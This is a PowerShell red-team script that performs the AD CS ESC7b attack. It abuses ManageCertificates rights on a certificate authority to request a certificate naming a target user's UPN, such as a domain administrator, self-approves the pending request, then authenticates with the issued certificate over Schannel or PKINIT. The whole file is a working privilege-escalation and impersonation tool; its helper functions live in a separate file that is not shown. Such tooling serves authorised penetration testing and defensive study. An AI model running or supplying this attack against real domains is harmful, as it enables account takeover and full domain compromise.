<#
.SYNOPSIS
    AD CS ESC7b - ManageCertificates -> Self-Approve (LOLBAS).
.DESCRIPTION
    Uses ManageCertificates rights to submit a certificate request then
    self-approve the pending request via certutil -resubmit.
.PARAMETER CAConfig
    CA configuration string (e.g., "polaris.zsec.red\corp-DC01-CA")
.PARAMETER TemplateName
    Template requiring manager approval (which you can self-approve)
.PARAMETER TargetUPN
    UPN of the user to impersonate
.EXAMPLE
    .\Invoke-ESC7b.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "ApprovalTemplate" -TargetUPN "administrator@zsec.red"
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$CAConfig,
    [Parameter(Mandatory)] [string]$TemplateName,
    [Parameter(Mandatory)] [string]$TargetUPN,

    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [string]$DCTarget,
    [switch]$SkipAuth
)

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC7b Standalone" -ForegroundColor White
Write-Host "  ---------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC7b" "ManageCertificates -> Self-Approve"

Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Template with manager approval: $TemplateName" -ForegroundColor Gray
Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'

# STAGE 3: SUBMIT (will be pending)
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST (pending)"
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" -SAN "upn=$TargetUPN&" `
    -Template $TemplateName -OutFile "$OutputDir\esc7b.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc7b"

if ($result.RequestId) {
    # STAGE 3.5: APPROVE
    Write-Host ""
    Write-Stage -Number 3 -Name "SELF-APPROVE PENDING REQUEST"
    $approved = Invoke-ApprovePendingRequest -CA $CAConfig -RequestId $result.RequestId -Prefix "esc7b"
    if ($approved.Success) {
        Write-Stage -Number 3 -Name "SELF-APPROVE" -Status 'COMPLETE'

        Write-Host ""
        Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

        Invoke-AuthStage -PFXFile $approved.PFXFile -PFXPass $PFXPassword -DC $DCTarget
    }
} elseif ($result.Success) {
    Write-Host "    [i] Request was approved automatically (no manager approval required?)" -ForegroundColor Yellow
    Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget
}

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
